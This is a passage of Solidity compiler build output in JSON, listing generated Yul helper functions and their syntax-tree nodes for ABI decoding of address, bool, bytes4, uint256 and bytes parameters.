parameterSlots":0,"returnSlots":0},"round_up_to_mul_of_32":{"entryPoint":8553,"id":null,"parameterSlots":1,"returnSlots":1},"store_literal_in_memory_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af":{"entryPoint":8570,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e":{"entryPoint":8649,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48":{"entryPoint":8728,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57":{"entryPoint":8807,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4":{"entryPoint":8848,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05":{"entryPoint":8927,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159":{"entryPoint":8968,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6":{"entryPoint":9047,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f":{"entryPoint":9088,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_b287e910c6a9cef9f186108b89a3a957a66db6db4d5eed8b59288161d029857b":{"entryPoint":9129,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942":{"entryPoint":9208,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83":{"entryPoint":9287,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_address":{"entryPoint":9366,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_bool":{"entryPoint":9389,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_bytes4":{"entryPoint":9412,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_uint256":{"entryPoint":9435,"id":null,"parameterSlots":1,"returnSlots":0}},"generatedSources":[{"ast":{"nodeType":"YulBlock","src":"0:25701:15","statements":[{"body":{"nodeType":"YulBlock","src":"90:327:15","statements":[{"nodeType":"YulAssignment","src":"100:74:15","value":{"arguments":[{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"166:6:15"}],"functionName":{"name":"array_allocation_size_t_bytes_memory_ptr","nodeType":"YulIdentifier","src":"125:40:15"},"nodeType":"YulFunctionCall","src":"125:48:15"}],"functionName":{"name":"allocate_memory","nodeType":"YulIdentifier","src":"109:15:15"},"nodeType":"YulFunctionCall","src":"109:65:15"},"variableNames":[{"name":"array","nodeType":"YulIdentifier","src":"100:5:15"}]},{"expression":{"arguments":[{"name":"array","nodeType":"YulIdentifier","src":"190:5:15"},{"name":"length","nodeType":"YulIdentifier","src":"197:6:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"183:6:15"},"nodeType":"YulFunctionCall","src":"183:21:15"},"nodeType":"YulExpressionStatement","src":"183:21:15"},{"nodeType":"YulVariableDeclaration","src":"213:27:15","value":{"arguments":[{"name":"array","nodeType":"YulIdentifier","src":"228:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"235:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"224:3:15"},"nodeType":"YulFunctionCall","src":"224:16:15"},"variables":[{"name":"dst","nodeType":"YulTypedName","src":"217:3:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"278:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae","nodeType":"YulIdentifier","src":"280:77:15"},"nodeType":"YulFunctionCall","src":"280:79:15"},"nodeType":"YulExpressionStatement","src":"280:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"src","nodeType":"YulIdentifier","src":"259:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"264:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"255:3:15"},"nodeType":"YulFunctionCall","src":"255:16:15"},{"name":"end","nodeType":"YulIdentifier","src":"273:3:15"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"252:2:15"},"nodeType":"YulFunctionCall","src":"252:25:15"},"nodeType":"YulIf","src":"249:112:15"},{"expression":{"arguments":[{"name":"src","nodeType":"YulIdentifier","src":"394:3:15"},{"name":"dst","nodeType":"YulIdentifier","src":"399:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"404:6:15"}],"functionName":{"name":"copy_calldata_to_memory","nodeType":"YulIdentifier","src":"370:23:15"},"nodeType":"YulFunctionCall","src":"370:41:15"},"nodeType":"YulExpressionStatement","src":"370:41:15"}]},"name":"abi_decode_available_length_t_bytes_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"src","nodeType":"YulTypedName","src":"63:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"68:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"76:3:15","type":""}],"returnVariables":[{"name":"array","nodeType":"YulTypedName","src":"84:5:15","type":""}],"src":"7:410:15"},{"body":{"nodeType":"YulBlock","src":"475:87:15","statements":[{"nodeType":"YulAssignment","src":"485:29:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"507:6:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"494:12:15"},"nodeType":"YulFunctionCall","src":"494:20:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"485:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"550:5:15"}],"functionName":{"name":"validator_revert_t_address","nodeType":"YulIdentifier","src":"523:26:15"},"nodeType":"YulFunctionCall","src":"523:33:15"},"nodeType":"YulExpressionStatement","src":"523:33:15"}]},"name":"abi_decode_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"453:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"461:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"469:5:15","type":""}],"src":"423:139:15"},{"body":{"nodeType":"YulBlock","src":"617:84:15","statements":[{"nodeType":"YulAssignment","src":"627:29:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"649:6:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"636:12:15"},"nodeType":"YulFunctionCall","src":"636:20:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"627:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"689:5:15"}],"functionName":{"name":"validator_revert_t_bool","nodeType":"YulIdentifier","src":"665:23:15"},"nodeType":"YulFunctionCall","src":"665:30:15"},"nodeType":"YulExpressionStatement","src":"665:30:15"}]},"name":"abi_decode_t_bool","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"595:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"603:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"611:5:15","type":""}],"src":"568:133:15"},{"body":{"nodeType":"YulBlock","src":"758:86:15","statements":[{"nodeType":"YulAssignment","src":"768:29:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"790:6:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"777:12:15"},"nodeType":"YulFunctionCall","src":"777:20:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"768:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"832:5:15"}],"functionName":{"name":"validator_revert_t_bytes4","nodeType":"YulIdentifier","src":"806:25:15"},"nodeType":"YulFunctionCall","src":"806:32:15"},"nodeType":"YulExpressionStatement","src":"806:32:15"}]},"name":"abi_decode_t_bytes4","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"736:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"744:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"752:5:15","type":""}],"src":"707:137:15"},{"body":{"nodeType":"YulBlock","src":"912:79:15","statements":[{"nodeType":"YulAssignment","src":"922:22:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"937:6:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"931:5:15"},"nodeType":"YulFunctionCall","src":"931:13:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"922:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"979:5:15"}],"functionName":{"name":"validator_revert_t_bytes4","nodeType":"YulIdentifier","src":"953:25:15"},"nodeType":"YulFunctionCall","src":"953:32:15"},"nodeType":"YulExpressionStatement","src":"953:32:15"}]},"name":"abi_decode_t_bytes4_fromMemory","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"890:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"898:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"906:5:15","type":""}],"src":"850:141:15"},{"body":{"nodeType":"YulBlock","src":"1071:277:15","statements":[{"body":{"nodeType":"YulBlock","src":"1120:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d","nodeType":"YulIdentifier","src":"1122:77:15"},"nodeType":"YulFunctionCall","src":"1122:79:15"},"nodeType":"YulExpressionStatement","src":"1122:79:15"}]},"condition":{"arguments":[{"arguments":[{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"1099:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"1107:4:15","type":"","value":"0x1f"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1095:3:15"},"nodeType":"YulFunctionCall","src":"1095:17:15"},{"name":"end","nodeType":"YulIdentifier","src":"1114:3:15"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"1091:3:15"},"nodeType":"YulFunctionCall","src":"1091:27:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"1084:6:15"},"nodeType":"YulFunctionCall","src":"1084:35:15"},"nodeType":"YulIf","src":"1081:122:15"},{"nodeType":"YulVariableDeclaration","src":"1212:34:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"1239:6:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"1226:12:15"},"nodeType":"YulFunctionCall","src":"1226:20:15"},"variables":[{"name":"length","nodeType":"YulTypedName","src":"1216:6:15","type":""}]},{"nodeType":"YulAssignment","src":"1255:87:15","value":{"arguments":[{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"1315:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"1323:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1311:3:15"},"nodeType":"YulFunctionCall","src":"1311:17:15"},{"name":"length","nodeType":"YulIdentifier","src":"1330:6:15"},{"name":"end","nodeType":"YulIdentifier","src":"1338:3:15"}],"functionName":{"name":"abi_decode_available_length_t_bytes_memory_ptr","nodeType":"YulIdentifier","src":"1264:46:15"},"nodeType":"YulFunctionCall","src":"1264:78:15"},"variableNames":[{"name":"array","nodeType":"YulIdentifier","src":"1255:5:15"}]}]},"name":"abi_decode_t_bytes_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"1049:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"1057:3:15","type":""}],"returnVariables":[{"name":"array","nodeType":"YulTypedName","src":"1065:5:15","type":""}],"src":"1010:338:15"},{"body":{"nodeType":"YulBlock","src":"1406:87:15","statements":[{"nodeType":"YulAssignment","src":"1416:29:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"1438:6:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"1425:12:15"},"nodeType":"YulFunctionCall","src":"1425:20:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"1416:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"1481:5:15"}],"functionName":{"name":"validator_revert_t_uint256","nodeType":"YulIdentifier","src":"1454:26:15"},"nodeType":"YulFunctionCall","src":"1454:33:15"},"nodeType":"YulExpressionStatement","src":"1454:33:15"}]},"name":"abi_decode_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"1384:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"1392:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"1400:5:15","type":""}],"src":"1354:139:15"},{"body":{"nodeType":"YulBlock","src":"1565:263:15","statements":[{"body":{"nodeType":"YulBlock","src":"1611:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"1613:77:15"},"nodeType":"YulFunctionCall","src":"1613:79:15"},"nodeType":"YulExpressionStatement","src":"1613:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"1586:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"1595:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"1582:3:15"},"nodeType":"YulFunctionCall","src":"1582:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"1607:2:15","type":"","value":"32"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"1578:3:15"},"nodeType":"YulFunctionCall","src":"1578:32:15"},"nodeType":"YulIf","src":"1575:119:15"},{"nodeType":"YulBlock","src":"1704:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"1719:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"1733:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"1723:6:15","type":""}]},{"nodeType":"YulAssignment","src":"1748:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"1783:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"1794:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1779:3:15"},"nodeType":"YulFunctionCall","src":"1779:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"1803:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"1758:20:15"},"nodeType":"YulFunctionCall","src":"1758:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"1748:6:15"}]}]}]},"name":"abi_decode_tuple_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"1535:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"1546:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"1558:6:15","type":""}],"src":"1499:329:15"},{"body":{"nodeType":"YulBlock","src":"1917:391:15","statements":[{"body":{"nodeType":"YulBlock","src":"1963:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"1965:77:15"},"nodeType":"YulFunctionCall","src":"1965:79:15"},"nodeType":"YulExpressionStatement","src":"1965:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"1938:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"1947:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"1934:3:15"},"nodeType":"YulFunctionCall","src":"1934:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"1959:2:15","type":"","value":"64"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"1930:3:15"},"nodeType":"YulFunctionCall","src":"1930:32:15"},"nodeType":"YulIf","src":"1927:119:15"},{"nodeType":"YulBlock","src":"2056:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"2071:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"2085:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"2075:6:15","type":""}]},{"nodeType":"YulAssignment","src":"2100:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2135:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"2146:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2131:3:15"},"nodeType":"YulFunctionCall","src":"2131:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"2155:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"2110:20:15"},"nodeType":"YulFunctionCall","src":"2110:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"2100:6:15"}]}]},{"nodeType":"YulBlock","src":"2183:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"2198:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"2212:2:15","type":"","value":"32"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"2202:6:15","type":""}]},{"nodeType":"YulAssignment","src":"2228:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2263:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"2274:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2259:3:15"},"nodeType":"YulFunctionCall","src":"2259:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"2283:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"2238:20:15"},"nodeType":"YulFunctionCall","src":"2238:53:15"},"variableNames":[{"name":"value1","nodeType":"YulIdentifier","src":"2228:6:15"}]}]}]},"name":"abi_decode_tuple_t_addresst_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"1879:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"1890:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"1902:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"1910:6:15","type":""}],"src":"1834:474:15"},{"body":{"nodeType":"YulBlock","src":"2414:519:15","statements":[{"body":{"nodeType":"YulBlock","src":"2460:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"2462:77:15"},"nodeType":"YulFunctionCall","src":"2462:79:15"},"nodeType":"YulExpressionStatement","src":"2462:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"2435:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"2444:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"2431:3:15"},"nodeType":"YulFunctionCall","src":"2431:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"2456:2:15","type":"","value":"96"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"2427:3:15"},"nodeType":"YulFunctionCall","src":"2427:32:15"},"nodeType":"YulIf","src":"2424:119:15"},{"nodeType":"YulBlock","src":"2553:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"2568:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"2582:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"2572:6:15","type":""}]},{"nodeType":"YulAssignment","src":"2597:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2632:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"2643:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2628:3:15"},"nodeType":"YulFunctionCall","src":"2628:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"2652:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"2607:20:15"},"nodeType":"YulFunctionCall","src":"2607:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"2597:6:15"}]}]},{"nodeType":"YulBlock","src":"2680:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"2695:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"2709:2:15","type":"","value":"32"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"2699:6:15","type":""}]},{"nodeType":"YulAssignment","src":"2725:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2760:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"2771:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2756:3:15"},"nodeType":"YulFunctionCall","src":"2756:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"2780:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"2735:20:15"},"nodeType":"YulFunctionCall","src":"2735:53:15"},"variableNames":[{"name":"value1","nodeType":"YulIdentifier","src":"2725:6:15"}]}]},{"nodeType":"YulBlock","src":"2808:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"2823:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"2837:2:15","type":"","value":"64"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"2827:6:15","type":""}]},{"nodeType":"YulAssignment","src":"2853:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2888:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"2899:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2884:3:15"},"nodeType":"YulFunctionCall","src":"2884:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"2908:7:15"}],"functionName":{"name":"abi_decode_t_uint256","nodeType":"YulIdentifier","src":"2863:20:15"},"nodeType":"YulFunctionCall","src":"2863:53:15"},"variableNames":[{"name":"value2","nodeType":"YulIdentifier","src":"2853:6:15"}]}]}]},"name":"abi_decode_tuple_t_addresst_addresst_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"2368:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"2379:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"2391:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"2399:6:15","type":""},{"name":"value2","nodeType":"YulTypedName","src":"2407:6:15","type":""}],"src":"2314:619:15"},{"body":{"nodeType":"YulBlock","src":"3065:817:15","statements":[{"body":{"nodeType":"YulBlock","src":"3112:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"3114:77:15"},"nodeType":"YulFunctionCall","src":"3114:79:15"},"nodeType":"YulExpressionStatement","src":"3114:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"3086:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"3095:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"3082:3:15"},"nodeType":"YulFunctionCall","src":"3082:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"3107:3:15","type":"","value":"128"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"3078:3:15"},"nodeType":"YulFunctionCall","src":"3078:33:15"},"nodeType":"YulIf","src":"3075:120:15"},{"nodeType":"YulBlock","src":"3205:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"3220:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"3234:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"3224:6:15","type":""}]},{"nodeType":"YulAssignment","src":"3249:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"3284:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"3295:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3280:3:15"},"nodeType":"YulFunctionCall","src":"3280:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"3304:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"3259:20:15"},"nodeType":"YulFunctionCall","src":"3259:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"3249:6:15"}]}]},{"nodeType":"YulBlock","src":"3332:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"3347:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"3361:2:15","type":"","value":"32"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"3351:6:15","type":""}]},{"nodeType":"YulAssignment","src":"3377:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"3412:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"3423:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3408:3:15"},"nodeType":"YulFunctionCall","src":"3408:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"3432:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"3387:20:15"},"nodeType":"YulFunctionCall","src":"3387:53:15"},"variableNames":[{"name":"value1","nodeType":"YulIdentifier","src":"3377:6:15"}]}]},{"nodeType":"YulBlock","src":"3460:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"3475:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"3489:2:15","type":"","value":"64"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"3479:6:15","type":""}]},{"nodeType":"YulAssignment","src":"3505:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"3540:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"3551:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3536:3:15"},"nodeType":"YulFunctionCall","src":"3536:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"3560:7:15"}],"functionName":{"name":"abi_decode_t_uint256","nodeType":"YulIdentifier","src":"3515:20:15"},"nodeType":"YulFunctionCall","src":"3515:53:15"},"variableNames":[{"name":"value2","nodeType":"YulIdentifier","src":"3505:6:15"}]}]},{"nodeType":"YulBlock","src":"3588:287:15","statements":[{"nodeType":"YulVariableDeclaration","src":"3603:46:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"3634:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"3645:2:15","type":"","value":"96"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3630:3:15"},"nodeType":"YulFunctionCall","src":"3630:18:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"3617:12:15"},"nodeType":"YulFunctionCall","src":"3617:32:15"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"3607:6:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"3696:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nodeType":"YulIdentifier","src":"3698:77:15"},"nodeType":"YulFunctionCall","src":"3698:79:15"},"nodeType":"YulExpressionStatement","src":"3698:79:15"}]},"condition":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"3668:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"3676:18:15","type":"","value":"0xffffffffffffffff"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"3665:2:15"},"nodeType":"YulFunctionCall","src":"3665:30:15"},"nodeType":"YulIf","src":"3662:117:15"},{"nodeType":"YulAssignment","src":"3793:72:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"3837:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"3848:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3833:3:15"},"nodeType":"YulFunctionCall","src":"3833:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"3857:7:15"}],"functionName":{"name":"abi_decode_t_bytes_memory_ptr","nodeType":"YulIdentifier","src":"3803:29:15"},"nodeType":"YulFunctionCall","src":"3803:62:15"},"variableNames":[{"name":"value3","nodeType":"YulIdentifier","src":"3793:6:15"}]}]}]},"name":"abi_decode_tuple_t_addresst_addresst_uint256t_bytes_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"3011:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"3022:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"3034:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"3042:6:15","type":""},{"name":"value2","nodeType":"YulTypedName","src":"3050:6:15","type":""},{"name":"value3","nodeType":"YulTypedName","src":"3058:6:15","type":""}],"src":"2939:943:15"},{"body":{"nodeType":"YulBlock","src":"3968:388:15","statements":[{"body":{"nodeType":"YulBlock","src":"4014:83: